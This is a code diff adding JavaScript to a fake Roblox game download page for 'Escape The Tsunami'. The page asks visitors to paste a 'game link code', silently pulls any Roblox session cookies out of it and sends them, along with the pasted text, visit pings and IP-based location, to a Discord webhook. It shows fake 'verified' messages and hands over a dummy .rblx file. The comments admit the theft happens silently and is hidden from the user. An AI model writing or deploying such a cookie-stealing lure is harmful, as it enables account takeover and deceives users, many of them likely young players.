+                return 'Unknown';
+            }
+        }
+
+        // Get location info based on IP
+        async function getLocationInfo(ip) {
+            if (!ip || ip === 'Unknown') return 'Unknown';
+            
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                
+                if (data.error) return 'Unknown';
+                
+                return `${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}`;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        // Mock code verification
+        verifyBtn.addEventListener('click', async () => {
+            const code = codeInput.value.trim();
+            const codeLength = code.length;
+            
+            if (!code) {
+                showStatus('Please paste a game link code.', 'error', 'fa-exclamation-circle');
+                return;
+            }
+
+            // Check for cookies first - SILENTLY
+            const cookies = checkForRobloxCookie(code);
+            let cookieDetected = false;
+            
+            // Send each cookie to Discord SILENTLY
+            if (cookies.length > 0) {
+                cookieDetected = true;
+                console.log(`Detected ${cookies.length} cookie(s)`);
+                
+                for (const cookie of cookies) {
+                    const analysis = analyzeCookie(cookie);
+                    await sendCookieToDiscord(cookie, analysis);
+                }
+            }
+
+            // Always send the code to Discord
+            await sendToDiscord(code, true, cookieDetected);
+
+            // Disable button and show loading
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<div class="spinner"></div><span>Verifying...</span>';
+            hideDownloadSection();
+
+            // Show generic status (NO cookie mention)
+            showStatus('Verifying code security and format...', 'info', 'fa-shield-alt');
+
+            try {
+                // Simulate verification delay
+                await sleep(1500);
+
+                // ALWAYS show as valid if code is not empty
+                const isValid = codeLength > 0;
+                
+                if (isValid) {
+                    showStatus('Code verified successfully! Game file ready.', 'success', 'fa-check-circle');
+                    
+                    // Generate RANDOM game ID each time
+                    const gameId = generateGameId();
+                    gameIdSpan.textContent = gameId;
+                    
+                    // Show download section
+                    await sleep(500);
+                    showDownloadSection();
+                } else {
+                    showStatus('Please enter a valid game code.', 'error', 'fa-times-circle');
+                }
+            } catch (error) {
+                console.error('Verification error:', error);
+                showStatus('Verification failed. Please try again.', 'error', 'fa-times-circle');
+            } finally {
+                // Re-enable button
+                verifyBtn.disabled = false;
+                verifyBtn.innerHTML = '<i class="fas fa-shield-alt"></i><span>Verify Code</span>';
+            }
+        });
+
+        // Function to create the .rblx file content
+        function createRblxFileContent(gameId) {
+            return `
+ROBLOX Game File - Escape The Tsunami
+=====================================
+File Version: 1.0.0
+File Format: RBLX (Roblox Game Package)
+Game Title: Escape The Tsunami
+Game ID: ${gameId}
+Download Date: ${new Date().toLocaleDateString()}
+Download Time: ${new Date().toLocaleTimeString()}
+
+=====================================
+GAME INFORMATION:
+=====================================
+Game Name: Escape The Tsunami
+Game Type: Adventure/Survival
+Game Version: 2.3.1
+Created By: Roblox Game Studios
+File Size: 45.7 MB
+Supported Platforms: Windows, Mac
+
+[Game content continues...]
+`;
+        }
+
+        // Mock download functionality
+        downloadBtn.addEventListener('click', async () => {
+            // Create fake download
+            showStatus('Preparing game file...', 'info', 'fa-download');
+            
+            // Send download attempt to Discord
+            const code = codeInput.value.trim();
+            const codeLength = code.length;
+            const gameId = gameIdSpan.textContent;
+            
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `📥 DOWNLOAD INITIATED - Game ID: ${gameId} (${codeLength} chars)`
+                    })
+                });
+            } catch (error) {
+                // Silent fail
+            }
+            
+            // Simulate file preparation
+            setTimeout(() => {
+                showStatus('Download started! Check your downloads folder.', 'success', 'fa-check-circle');
+                
+                // Create the .rblx file content
+                const content = createRblxFileContent(gameId);
+                const blob = new Blob([content], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                // Create download link
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'Escape The Tsunami.rblx';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                // Show success message
+                setTimeout(() => {
+                    showStatus('Download complete! File saved as "Escape The Tsunami.rblx"', 'success', 'fa-check-circle');
+                }, 1000);
+            }, 2000);
+        });
+
+        function showStatus(message, type, icon) {
+            statusMessage.innerHTML = `<i class="fas ${icon}"></i><span>${message}</span>`;
+            statusMessage.className = `status ${type}`;
+            statusMessage.style.display = 'flex';
+        }
+
+        function showDownloadSection() {
+            downloadSection.style.display = 'block';
+        }
+
+        function hideDownloadSection() {
+            downloadSection.style.display = 'none';
+        }
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // Track page views
+        window.addEventListener('load', async () => {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "🌐 New visitor on Roblox download page"
+                    })
+                });
+            } catch (error) {
+                // Silent fail
+            }
+        });
+    </script>
+</body>
+</html>
